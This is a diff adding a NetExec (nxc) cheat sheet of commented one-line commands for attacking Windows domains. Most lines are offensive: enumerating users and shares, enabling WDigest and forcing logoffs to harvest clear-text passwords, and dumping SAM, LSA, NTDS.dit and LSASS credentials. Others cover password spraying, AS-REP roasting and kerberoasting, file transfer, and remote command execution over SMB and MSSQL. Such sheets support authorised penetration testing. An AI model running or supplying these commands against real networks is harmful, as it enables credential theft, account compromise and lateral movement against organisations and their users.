@@ -1,2 +1,112 @@
 % netexec, nxc 
 
+# Enumerate hosts, network
+nxc smb <ip>
+
+# Enumerate password policy
+nxc smb <ip> -u <user> -p '<password>' --pass-pol
+
+# Enumerate null session
+nxc smb <ip> -u '' -p ''
+
+# Enumerate anonymous login
+nxc smb <ip> -u 'a' -p ''
+
+# Enumerate active sessions
+nxc smb <ip> -u <user> -p '<password>' --sessions
+
+# Enumerate domain users
+nxc smb <ip> -u <user> -p '<password>' --users
+
+# Enumerate users by bruteforce the RID
+nxc smb <ip> -u <user> -p '<password>' --rid-brute
+
+# Enumerate domain groups
+nxc smb <ip> -u <user> -p '<password>' --groups
+
+# Enumerate local groups
+nxc smb <ip> -u <user> -p '<password>' --local-groups
+
+# Enumerate permissions on all shares
+nxc smb <ip> -u <user> -p <password> -d <domain> --shares
+
+# Enumerate disks on the remote target
+nxc smb <ip> -u <user> -p '<password>' --disks
+
+# Enumerate smb target who don't require SMB signing
+nxc smb <ip> --gen-relay-list smb_targets.txt
+
+# Enumerate logged users
+nxc smb <ip> -u <user> -p '<password>' --loggedon-users
+
+# enable the WDigest provider and dump clear-text credentials from LSA memory.
+nxc smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
+
+# loggout user force to reconnect after enable WDigest
+nxc smb <ip> -u <user> -p '<password>' -x 'quser' && nxc smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
+
+# local-auth
+nxc smb <ip> -u <user> -p <password> --local-auth
+
+# local-auth with hash
+nxc smb <ip> -u <user> -H <hash> --local-auth
+
+# domain auth
+nxc smb <ip> -u <user> -p <password> -d <domain>
+
+# kerberos auth
+export KRB5CCNAME=/tmp/ticket.ccache nxc smb <ip> --kerberos
+
+# Dump SAM
+nxc smb <ip> -u <user> -p <password> -d <domain> --sam
+
+# Dump SAM with local account
+nxc smb <ip> -u <user> -p <password> -d <domain> --sam --local-auth
+
+# Dump LSA
+nxc smb <ip> -u <user> -p <password> -d <domain> --lsa
+
+# dump ntds.dit
+nxc smb <ip> -u <user> -p <password> -d <domain> --ntds
+
+# dump lsass
+nxc smb <ip> -u <user> -p <password> -d <domain> -M lsassy
+
+# dump lsass - with bloodhond update
+nxc smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user> NEO4JPASS=<neo4jpass>
+
+# password spray (user=password)
+nxc smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
+
+# password spray multiple test 
+nxc smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
+
+# put file
+nxc smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path>
+
+# get file
+nxc smb <ip> -u <user> -p <password> --get-file <remote_path> <local_file>
+
+# ASREPRoast enum without authentication (hashcat 18200)
+nxc ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+
+# ASREPRoast enum with authentication (hashcat 18200)
+nxc ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+
+# Kerberoasting (hashcat 13100)
+nxc ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
+
+# Unconstrained delegation (flag TRUSTED_FOR_DELEGATION)
+nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
+
+# winrm-auth
+nxc winrm <ip> -u <user> -p <password>
+
+# mssql password spray
+nxc mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
+
+# mssql execute query
+nxc mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+# mssql execute command
+nxc mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd>
